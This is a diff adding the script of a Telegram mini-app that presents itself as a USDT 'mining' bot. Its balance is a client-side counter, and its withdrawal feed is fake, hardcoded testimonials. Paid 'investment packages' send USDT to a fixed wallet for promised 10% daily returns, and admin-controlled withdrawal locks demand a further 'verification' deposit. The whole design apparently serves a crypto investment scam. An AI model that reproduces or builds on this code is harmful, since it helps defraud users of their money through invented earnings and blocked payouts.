+        <button class="btn-gold" style="background:#e2e8f0; color:#334155; box-shadow:none; margin-top:6px;" onclick="closeInvestModal()">Close</button>
+      </div>
+    </div>
+
+    <script>
+      // ==========================================
+      // 1. FIREBASE & BOT CONFIGURATION
+      // ==========================================
+      const firebaseConfig = {
+        apiKey: "AIzaSyCr-V3TxkQp4-Vmd7zFhqoLkfF8hAiDmzc",
+        authDomain: "onecoin-miner-bot.firebaseapp.com",
+        databaseURL: "https://onecoin-miner-bot-default-rtdb.asia-southeast1.firebasedatabase.app",
+        projectId: "onecoin-miner-bot",
+        storageBucket: "onecoin-miner-bot.firebasestorage.app",
+        messagingSenderId: "51465173443",
+        appId: "1:51465173443:web:c61078967f58d1571ba576"
+      };
+
+      const TG_BOT_USERNAME = "MinerFi_bot"; 
+      const DEPOSIT_ADDRESS = "0x541160E598Fd2d51c21aA977beb674bb207bFaB8";
+      const BASE_DAILY_RATE = 0.50;
+      const MIN_WITHDRAW_USDT = 1.00;
+
+      let dbFirebase = null;
+      try {
+        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+        dbFirebase = firebase.database();
+      } catch (e) {
+        console.warn("Firebase config fallback.");
+      }
+
+      // ==========================================
+      // 2. ALPHABETICAL REFERRAL CODE ENCODER/DECODER
+      // ==========================================
+      const REF_OFFSET = 11881376n; // 26^5 so all codes are at least 6 letters
+
+      function encodeUidToLetters(uid) {
+        try {
+          let num = BigInt(String(uid).replace(/\D/g, "") || "1000000") + REF_OFFSET;
+          let chars = "";
+          while (num > 0n) {
+            const rem = Number(num % 26n);
+            chars = String.fromCharCode(65 + rem) + chars;
+            num = num / 26n;
+          }
+          return chars;
+        } catch (e) {
+          return "MINERFI";
+        }
+      }
+
+      function decodeLettersToUid(code) {
+        const clean = String(code || "").trim().toUpperCase();
+        if (!/^[A-Z]+$/.test(clean)) return null;
+        let num = 0n;
+        for (let i = 0; i < clean.length; i++) {
+          num = num * 26n + BigInt(clean.charCodeAt(i) - 65);
+        }
+        const uidBig = num - REF_OFFSET;
+        return uidBig > 0n ? uidBig.toString() : null;
+      }
+
+      // ==========================================
+      // 3. TELEGRAM USER IDENTITY
+      // ==========================================
+      const tg = window.Telegram?.WebApp;
+      if (tg) { tg.ready(); tg.expand(); }
+
+      const tgUser = tg?.initDataUnsafe?.user;
+      const startParam = tg?.initDataUnsafe?.start_param;
+
+      const currentUid = tgUser?.id ? String(tgUser.id) : String(Math.floor(1000000 + Math.random() * 9000000));
+      const currentRefCode = encodeUidToLetters(currentUid);
+      const currentUsername = tgUser?.username || tgUser?.first_name || ("User_" + currentUid.slice(-4));
+      const currentPhoto = tgUser?.photo_url || "https://i.imgur.com/6VBx3io.png";
+
+      let userState = {
+        uid: currentUid,
+        refCode: currentRefCode,
+        username: currentUsername,
+        photo_url: currentPhoto,
+        balance: 0.00,
+        dailyRate: BASE_DAILY_RATE,
+        lastSync: Date.now(),
+        withdrawUnlocked: true,
+        invitedBy: null,
+        refCount: 0,
+        tasks: {}
+      };
+
+      let isGlobalUsdtOpen = true;
+      let selectedPkg = 1;
+
+      // ==========================================
+      // 4. LIVE WITHDRAW MARQUEE (KANAN KE KIRI)
+      // ==========================================
+      const liveWithdrawFeed = [
+        { name: "Leona", amt: "$1" },
+        { name: "Marcus", amt: "$5" },
+        { name: "Elena", amt: "$2.50" },
+        { name: "Daniel", amt: "$10" },
+        { name: "Sophia", amt: "$1.20" },
+        { name: "Lucas", amt: "$3" }
+      ];
+
+      function initPayoutMarquee() {
+        const track = document.getElementById("payout-track");
+        if (!track) return;
+        const itemsHtml = liveWithdrawFeed.map(item => `
+          <span class="payout-item">
+            <span class="pm-pair">${item.name} Success Withdraw</span>
+            <span class="pm-price">${item.amt}</span>
+            <span class="payout-sep">•</span>
+          </span>
+        `).join("");
+        track.innerHTML = itemsHtml + itemsHtml;
+      }
+      initPayoutMarquee();
+
+      // ==========================================
+      // 5. INITIALIZATION & REAL-TIME SYNC
+      // ==========================================
+      function initUser() {
+        const resolvedInviterUid = startParam
+          ? (/^[A-Za-z]+$/.test(startParam) ? decodeLettersToUid(startParam) : startParam)
+          : null;
+
+        if (dbFirebase) {
+          const userRef = dbFirebase.ref("users/" + currentUid);
+          userRef.once("value", (snap) => {
+            const val = snap.val();
+            if (val) {
+              userState = { ...userState, ...val };
+              if (!userState.refCode) userState.refCode = currentRefCode;
+              if (!userState.tasks) userState.tasks = {};
+              if (!userState.dailyRate || userState.dailyRate < BASE_DAILY_RATE) userState.dailyRate = BASE_DAILY_RATE;
+            } else {
+              if (resolvedInviterUid && resolvedInviterUid !== currentUid) {
+                userState.invitedBy = resolvedInviterUid;
+                userState.balance = (Number(userState.balance) || 0) + 0.1;
+                recordReferral(resolvedInviterUid);
+              }
+              userRef.set(userState);
+            }
+            calculatePassive();
+            updateUI();
+            listenWithdrawals();
+          });
+
+          userRef.on("child_changed", (snap) => {
+            userState[snap.key] = snap.val();
+            if (snap.key === "dailyRate" && (!userState.dailyRate || userState.dailyRate < BASE_DAILY_RATE)) {
+              userState.dailyRate = BASE_DAILY_RATE;
+            }
+            updateUI();
+          });
+
+          dbFirebase.ref("settings/usdtWithdraw").on("value", (snap) => {
+            isGlobalUsdtOpen = snap.val() !== false;
+            updateUI();
+          });
+
+        } else {
+          const local = localStorage.getItem("user_" + currentUid);
+          if (local) userState = JSON.parse(local);
+          if (!userState.refCode) userState.refCode = currentRefCode;
+          if (!userState.tasks) userState.tasks = {};
+          if (!userState.dailyRate || userState.dailyRate < BASE_DAILY_RATE) userState.dailyRate = BASE_DAILY_RATE;
+          calculatePassive();
+          updateUI();
+        }
+      }
+
+      function saveUserState() {
+        if (dbFirebase) {
+          dbFirebase.ref("users/" + currentUid).update(userState);
+        } else {
+          localStorage.setItem("user_" + currentUid, JSON.stringify(userState));
+        }
+      }
+
+      function calculatePassive() {
+        const now = Date.now();
+        const elapsed = now - userState.lastSync;
+        const currentDailyRate = Number(userState.dailyRate) || BASE_DAILY_RATE;
+        const ratePerMs = currentDailyRate / 86400000;
+        userState.balance += elapsed * ratePerMs;
+        userState.lastSync = now;
+        saveUserState();
+      }
+
+      // ==========================================
+      // 6. NAVIGATION CONTROLLER
+      // ==========================================
+      function nav(id) {
+        document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
+        const targetPage = document.getElementById("page-" + id);
+        if (targetPage) targetPage.classList.add("active");
+
+        document.querySelectorAll(".nav-tab-item").forEach(n => n.classList.remove("active"));
+        const targetBtn = document.getElementById("nav-btn-" + id);
+        if (targetBtn) targetBtn.classList.add("active");
+
+        updateUI();
+      }
+
+      // ==========================================
+      // 7. WITHDRAWAL HANDLERS (MIN. $1.00 USDT)
+      // ==========================================
+      function handleWithdrawAction() {
+        if (!isGlobalUsdtOpen) {
+          return alert("WITHDRAWAL PAUSED:\n\nUSDT withdrawals are temporarily PAUSED for all users by the Administrator for system maintenance.");
+        }
+
+        if (userState.withdrawUnlocked === false) {
+          return alert("WITHDRAWAL BLOCKED:\n\nYour individual withdrawal has been LOCKED by the Administrator. Please deposit 1 USDT (BEP20) for verification or contact admin support.");
+        }
+
+        const addr = document.getElementById("wd-address").value.trim();
+        const amt = parseFloat(document.getElementById("wd-amt").value);
+
+        if (!addr || addr.length < 20) return alert("Please enter a valid USDT BEP20 address!");
+        if (isNaN(amt) || amt < MIN_WITHDRAW_USDT) return alert("Minimum withdrawal is $1.00 USDT!");
+        if (userState.balance < amt) return alert("Insufficient balance!");
+
+        userState.balance -= amt;
+        saveUserState();
+        updateUI();
+
+        const wdData = {
+          uid: currentUid,
+          username: userState.username,
+          address: addr,
+          amount: amt,
+          currency: "USDT",
+          status: "pending",
+          timestamp: Date.now()
+        };
+
+        if (dbFirebase) dbFirebase.ref("withdrawals").push(wdData);
+
+        alert("Withdrawal request of $" + amt.toFixed(2) + " USDT submitted successfully! Pending admin confirmation.");
+        document.getElementById("wd-amt").value = "";
+      }
+
+      function listenWithdrawals() {
+        if (!dbFirebase) return;
+        const wdRef = dbFirebase.ref("withdrawals").orderByChild("uid").equalTo(currentUid);
+
+        wdRef.on("value", (snap) => {
+          const list = [];
+          snap.forEach((child) => {
+            list.unshift(child.val());
+          });
+          renderHistory(list);
+        });
+      }
+
+      function renderHistory(list) {
+        const container = document.getElementById("history-list");
+        if (!list || list.length === 0) {
+          container.innerHTML = `<p style="text-align: center; color: var(--text-muted); font-size: 12px; padding: 10px;">No transaction history yet.</p>`;
+          return;
+        }
+
+        container.innerHTML = list.map(item => {
+          const addr = item.address || "-";
+          const shortAddr = addr.length > 20 ? (addr.slice(0, 8) + "..." + addr.slice(-6)) : addr;
+          const dateStr = item.timestamp ? new Date(item.timestamp).toLocaleString("en-US", {
+            dateStyle: "short",
+            timeStyle: "short"
+          }) : "-";
+
+          let statusBadge = "";
+          const currentStatus = (item.status || "pending").toLowerCase();
+
+          if (currentStatus === "approved" || currentStatus === "success") {
+            statusBadge = `<span style="color: #10b981; font-weight: 800; background: #ecfdf5; padding: 4px 10px; border-radius: 8px; font-size: 11px; border: 1px solid #a7f3d0;">
+              <i class="fas fa-check-circle"></i> SUCCESS
+            </span>`;
+          } else if (currentStatus === "rejected") {
+            statusBadge = `<span style="color: #ef4444; font-weight: 800; background: #fef2f2; padding: 4px 10px; border-radius: 8px; font-size: 11px; border: 1px solid #fecaca;">
+              <i class="fas fa-times-circle"></i> REJECTED
+            </span>`;
+          } else {
+            statusBadge = `<span style="color: #d97706; font-weight: 800; background: #fffbeb; padding: 4px 10px; border-radius: 8px; font-size: 11px; border: 1px solid #fde68a;">
+              <i class="fas fa-clock"></i> PENDING
+            </span>`;
+          }
+
+          return `
+            <div style="display: flex; justify-content: space-between; align-items: center; padding: 12px 0; border-bottom: 1px solid #e2e8f0;">
+              <div>
+                <b style="font-size: 14px; color: #0f172a;">$${Number(item.amount).toFixed(2)} USDT</b>
+                <div style="font-size: 11px; color: var(--text-muted); margin-top: 3px; font-family: monospace;">
+                  <i class="fas fa-wallet" style="color: #f59e0b; font-size: 10px;"></i> ${shortAddr}
+                </div>
+                <div style="font-size: 10px; color: #94a3b8; margin-top: 3px;">
+                  <i class="far fa-calendar-alt"></i> ${dateStr}
+                </div>
+              </div>
+              <div style="text-align: right;">
+                ${statusBadge}
+              </div>
+            </div>
+          `;
+        }).join("");
+      }
+
+      // ========================================================
+      // 8. DEPOSIT & PACKAGE SIMULATION ($1-$10 + $15,$25,$50,$75,$100)
+      // ========================================================
+      function openInvestModal(pkgAmount) {
+        selectedPkg = pkgAmount;
+        const baseRate = BASE_DAILY_RATE;
+        const bonusDaily = pkgAmount * 0.10;
+        const totalNewRate = baseRate + bonusDaily;
+
+        document.getElementById("modal-title").innerText = `Investment Package: $${pkgAmount} USDT`;
+        document.getElementById("sim-pkg-cost").innerText = `$${pkgAmount}.00 USDT`;
+        document.getElementById("sim-pkg-bonus").innerText = `+$${bonusDaily.toFixed(2)} / day`;
+        document.getElementById("sim-pkg-total").innerText = `$${totalNewRate.toFixed(2)} / day`;
+        document.getElementById("sender-usdt-address").value = "";
+        document.getElementById("invest-modal").style.display = "flex";
+      }
+
+      function closeInvestModal() {
+        document.getElementById("invest-modal").style.display = "none";
+      }
+
+      function submitDepositConfirmation() {
+        const senderAddr = document.getElementById("sender-usdt-address").value.trim();
+        if (!senderAddr || senderAddr.length < 20) {
+          return alert("Please enter your sender wallet address correctly!");
+        }
+
+        const depositData = {
+          uid: currentUid,
+          username: userState.username,
+          pkgAmount: selectedPkg,
+          senderAddress: senderAddr,
+          targetAddress: DEPOSIT_ADDRESS,
+          expectedDailyProfit: selectedPkg * 0.10,
+          status: "pending",
+          timestamp: Date.now()
+        };
+
+        if (dbFirebase) dbFirebase.ref("deposits").push(depositData);
+
+        alert(`Deposit submitted!\n\nAdmin will verify the transaction from:\n${senderAddr}\n\nOnce approved, your daily mining profit will increase by +$${(selectedPkg * 0.10).toFixed(2)}/day.`);
+        closeInvestModal();
+      }
+
+      const pkgAmounts = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 15, 25, 50, 75, 100];
+      const pkgGrid = document.getElementById("pkg-list");
+      pkgAmounts.forEach((amt) => {
+        const d = document.createElement("div");
+        d.className = "glass-pkg-item";
+        d.onclick = () => openInvestModal(amt);
+        d.innerHTML = `<b>$${amt}</b><small>+${(amt * 0.10).toFixed(2)}/D</small>`;
+        pkgGrid.appendChild(d);
+      });
+
+      // ==========================================
+      // 9. TASK LOGIC (NO REWARD)
+      // ==========================================
+      function doTask(id, url) {
+        if (userState.tasks && userState.tasks[id]) {
+          return alert("This task is already completed!");
+        }
+
+        window.open(url, "_blank");
+
+        setTimeout(() => {
+          if (!userState.tasks) userState.tasks = {};
+          userState.tasks[id] = true;
+          
+          saveUserState();
+          updateUI();
+          
+          alert("Task completed! Thank you for joining the channel.");
+        }, 2000);
+      }
+
+      function updateTaskButtons() {
+        const taskMap = [
+          { id: 'durov', btnId: 'btn-task-durov' },
+          { id: 'walt', btnId: 'btn-task-walt' },
+          { id: 'onecoin5', btnId: 'btn-task-onecoin5' }
+        ];
+
+        taskMap.forEach(item => {
+          const btn = document.getElementById(item.btnId);
+          if (btn) {
+            if (userState.tasks && userState.tasks[item.id]) {
+              btn.className = "btn-gold btn-done";
+              btn.disabled = true;
+              btn.innerHTML = '<i class="fas fa-check"></i> Completed';
+              btn.style.width = "auto";
+              btn.style.margin = "0";
+              btn.style.padding = "8px 18px";
+              btn.style.fontSize = "12px";
+            } else {
+              btn.className = "btn-gold";
+              btn.disabled = false;
+              btn.innerHTML = 'Join';
+              btn.style.width = "auto";
+              btn.style.margin = "0";
+              btn.style.padding = "8px 18px";
+              btn.style.fontSize = "12px";
+            }
+          }
+        });
+      }
+
+      // ==========================================
+      // 10. REFERRAL SYSTEM (BONUS: +$0.10 USDT)
+      // ==========================================
+      function recordReferral(inviterId) {
+        if (!dbFirebase) return;
+        const inviterRef = dbFirebase.ref("users/" + inviterId);
+        inviterRef.once("value", (snap) => {
+          if (snap.exists()) {
+            inviterRef.child("refCount").set(firebase.database.ServerValue.increment(1));
+            inviterRef.child("balance").set(firebase.database.ServerValue.increment(0.1));
+          }
+        });
+      }
+
+      function submitManualRef() {
+        const rawInput = document.getElementById("input-inviter-id").value.trim().toUpperCase();
+        if (!rawInput) return alert("Please enter an Inviter Referral Code!");
+        if (!/^[A-Z]+$/.test(rawInput)) return alert("Invalid code! Please enter letters only (e.g. BCDEFG).");
+
+        const inviterId = decodeLettersToUid(rawInput);
+        if (!inviterId) return alert("Invalid Inviter Code!");
+        if (inviterId === currentUid) return alert("You cannot enter your own referral code!");
+        if (userState.invitedBy) return alert("You already have an inviter (Code: " + encodeUidToLetters(userState.invitedBy) + ")");
+
+        if (dbFirebase) {
+          dbFirebase.ref("users/" + inviterId).once("value", (snap) => {
+            if (snap.exists()) {
+              userState.invitedBy = inviterId;
+              userState.balance = (Number(userState.balance) || 0) + 0.1;
+              
+              recordReferral(inviterId);
+              saveUserState();
+              updateUI();
+              
+              alert("Inviter linked successfully: " + rawInput + "\n\nCongratulations! You received an instant +$0.10 bonus!");
+            } else {
+              alert("Inviter code not found!");
+            }
+          });
+        }
+      }
+
+      // ==========================================
+      // 11. UI SYNCHRONIZATION
+      // ==========================================
+      function updateUI() {
+        document.getElementById("bal-main").innerText = userState.balance.toFixed(6);
+        document.getElementById("rate-display").innerText = (Number(userState.dailyRate) || BASE_DAILY_RATE).toFixed(2);
+        document.getElementById("prof-user").innerText = "@" + userState.username;
+        document.getElementById("prof-ref-code").innerText = userState.refCode || currentRefCode;
+        document.getElementById("prof-avatar").src = userState.photo_url;
+        document.getElementById("prof-bal-usdt").innerText = userState.balance.toFixed(4);
+
+        const refCodeLetters = userState.refCode || encodeUidToLetters(userState.uid);
+        const refLink = `https://t.me/${TG_BOT_USERNAME}/miniapp?startapp=${refCodeLetters}`;
+        document.getElementById("ref-link").innerText = refLink;
+        document.getElementById("ref-count").innerText = userState.refCount || 0;
+
+        const isLocked = (!isGlobalUsdtOpen) || (userState.withdrawUnlocked === false);
+
+        if (!isLocked) {
+          document.getElementById("wd-locked-box").style.display = "none";
+          document.getElementById("wd-unlocked-box").style.display = "block";
+        } else {
+          document.getElementById("wd-locked-box").style.display = "block";
+          document.getElementById("wd-unlocked-box").style.display = "none";
+        }
+
+        updateTaskButtons();
+
+        if (userState.invitedBy) {
+          const btn = document.getElementById("btn-submit-ref");
+          btn.disabled = true;
+          btn.innerText = "Linked: " + encodeUidToLetters(userState.invitedBy) + " (+$0.10 Claimed)";
+          btn.style.opacity = "0.7";
+        }
+      }
+
+      function copyRef() {
+        navigator.clipboard.writeText(document.getElementById("ref-link").innerText);
+        showToast("Link Copied!");
+      }
+
+      function copyAddr() {
+        navigator.clipboard.writeText(DEPOSIT_ADDRESS);
+        showToast("Address Copied!");
+      }
+
+      function showToast(text) {
+        const t = document.getElementById("toast");
+        t.innerText = text;
+        t.style.display = "block";
+        setTimeout(() => { t.style.display = "none"; }, 2000);
+      }
+
+      initUser();
+
+      setInterval(() => {
+        calculatePassive();
+        document.getElementById("bal-main").innerText = userState.balance.toFixed(6);
+        document.getElementById("prof-bal-usdt").innerText = userState.balance.toFixed(4);
+      }, 1000);
+    </script>
+  </body>
+</html>
